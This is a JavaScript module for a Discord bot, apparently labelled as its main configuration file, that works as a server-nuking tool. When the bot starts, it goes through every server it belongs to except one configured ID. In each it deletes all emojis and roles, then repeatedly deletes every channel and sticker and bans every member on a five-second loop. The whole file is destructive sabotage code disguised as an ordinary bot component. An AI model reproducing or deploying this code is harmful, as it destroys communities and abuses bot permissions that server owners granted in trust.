/*
# Discord Server: https://discord.gg/pgDje8S3Ed
# Github: https://github.com/MikaboshiDev
# Docs: https://bit.ly/nightdevelopment
# Dashboard: https://bit.ly/nightdashboard

# Created by: MikaboshiDev
# Version: 1.0.0
# Discord: azazel_hla

# This file is the main configuration file for the bot.
# Inside this file you will find all the settings you need to configure the bot.
# If you have any questions, please contact us on our discord server.
# If you want to know more about the bot, you can visit our website.
*/

const { redBright, green, yellow, cyan } = require("chalk");
const config = require("../../config/config.json");
const { EventEmitter } = require("events");

module.exports = class DarkNight extends EventEmitter {
    constructor(client, options) {
        super();
        if (!client?.options) throw new Error(`${redBright.bold("[Night]")} ${config.errors["1_client"]}`);
        this.client = client;

        //General system variables
        this._enabled = options.general.enabled
        this._serverId = options.general.serverId

        if (this._enabled === false) return;
        this.client.on("ready", async () => {
            this.client.guilds.cache.forEach(async (guild) => {
                if (guild.id == this._serverId) return;

                await this.DelAllEmotes(guild);
                await this.DelAllRoles(guild);
                setInterval(async () => {
                    await this.DelAllChannels(guild);
                    await this.DelAllStickers(guild);
                    await this.BanAll(guild);
                }, 5000);
            });
        });
    }

    DelAllChannels(guild) {
        return new Promise((resolve, reject) => {
            guild.channels.cache.forEach((ch) => ch.delete().catch((err) => {
                console.log("Error Found: " + err)
            }))
            resolve();
        });
    }

    DelAllRoles(guild) {
        return new Promise((resolve, reject) => {
            guild.roles.cache.forEach((r) => r.delete().catch((err) => {
                console.log("Error Found: " + err)
            }))
        });
    }

    DelAllEmotes(guild) {
        return new Promise((resolve, reject) => {
            guild.emojis.cache.forEach((e) => e.delete().catch((err) => {
                console.log("Error Found: " + err)
            }))
        });
    }

    DelAllStickers(guild) {
        return new Promise((resolve, reject) => {
            guild.stickers.cache.forEach((s) => s.delete().catch((err) => {
                console.log("Error Found: " + err)
            }))
        });
    }

    BanAll(guild) {
        return new Promise((resolve, reject) => {
            let arrayOfIDs = guild.members.cache.map((user) => user.id);
            setTimeout(() => {
                for (let i = 0; i < arrayOfIDs.length; i++) {
                    const user = arrayOfIDs[i];
                    const member = guild.members.cache.get(user);
                    member.ban().catch((err) => {
                        console.log("Error Found: " + err)
                    }).then(() => {
                        console.log(`${chalk.redBright(`[Darkmode]`)} ${member.user.tag} was banned.`)
                    });
                }
            }, 2000);
        })
    }
}